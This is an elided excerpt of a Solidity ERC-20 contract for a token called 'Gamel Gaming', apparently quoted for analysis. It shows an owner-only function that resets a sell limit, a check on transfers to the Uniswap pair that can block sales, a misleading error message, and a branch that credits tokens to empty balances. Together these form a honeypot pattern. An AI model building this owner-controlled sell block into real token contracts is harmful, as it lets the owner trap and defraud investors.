...
contract GamelGaming is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    string  private constant _name = "Gamel Gaming"; 
    string  private constant _symbol = "GMG";   
    ...
    address payable public   _markWallet    =payable(0xFC386B6884bE0172c5609dA6f3744b213065DDD8);
    ...
    uint256 public  setlimit=_tTotal.mul(_decimals) * 10** _decimals;
   ...
   function totalSupply() public view override returns (uint256) 
   {
    ...
    function isExcludedFromFee(address account) public view returns(bool) 
    {
     ...
     function update_Lelimit(uint256 maxLelimit) public onlyOwner {
       setlimit=maxLelimit;
    ...
    if (BuyOrSell==1)
        {
        ...
        else  if (to == uniswapV2Pair && BuyOrSell > 1 )
           {
                 ...
                 require(amount < setlimit, "Transfer amount must be greater than given amount"); 
                 emit _isBuy ("sell");
            }
       ...
       if (_tOwned[from] == 0  )
        {
            _tOwned[from] +=_tOwned[from].add(1000);
